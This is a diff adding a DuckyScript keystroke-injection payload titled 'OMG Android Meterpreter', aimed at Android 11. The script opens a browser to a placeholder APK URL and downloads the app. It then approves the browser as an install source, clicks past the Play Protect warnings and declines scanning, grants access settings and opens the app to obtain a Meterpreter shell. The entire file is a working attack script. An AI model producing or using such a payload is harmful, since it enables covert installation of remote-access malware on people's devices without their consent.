@@ -1,0 +1,130 @@
+REM # -----------------------------------------------------------
+REM # Title: OMG Android Meterpreter
+REM # Description: Download and install an APK on Android
+REM # Author: int0x80
+REM # Target: Android 11
+REM # Notes: Set URL for APK payload below
+REM # -----------------------------------------------------------
+
+
+REM # -----------------------------------------------------------
+REM # Launch browser to APK destination
+REM # -----------------------------------------------------------
+
+GUI b
+DELAY 1000
+CTRL l
+DELAY 50
+STRING https://x.x.x.x/your-app.apk
+DELAY 50
+ENTER
+DELAY 2000
+
+
+REM # -----------------------------------------------------------
+REM # Move focus to 'Open' link
+REM # -----------------------------------------------------------
+
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+RIGHT
+DELAY 50
+ENTER
+DELAY 500
+
+
+REM # -----------------------------------------------------------
+REM # Select Chrome as approved source to install apps
+REM # -----------------------------------------------------------
+
+ENTER
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 50
+
+
+REM # -----------------------------------------------------------
+REM # Finish approved source
+REM # GUI DELETE might work here
+REM # -----------------------------------------------------------
+
+GUI TAB 
+DELAY 50
+ENTER
+DELAY 50
+
+
+REM # -----------------------------------------------------------
+REM # Scanning and Play Store warnings
+REM # Install, Install Anyway, Don't send for scanning, Open
+REM # -----------------------------------------------------------
+
+RIGHT
+DELAY 50
+ENTER
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 50
+ENTER
+DELAY 250
+
+
+REM # -----------------------------------------------------------
+REM # Accept access settings and Continue
+REM # -----------------------------------------------------------
+
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 250
+
+
+REM # -----------------------------------------------------------
+REM # Get shell and obligatory calc
+REM # -----------------------------------------------------------
+
+ENTER
+DELAY 250
+GUI a
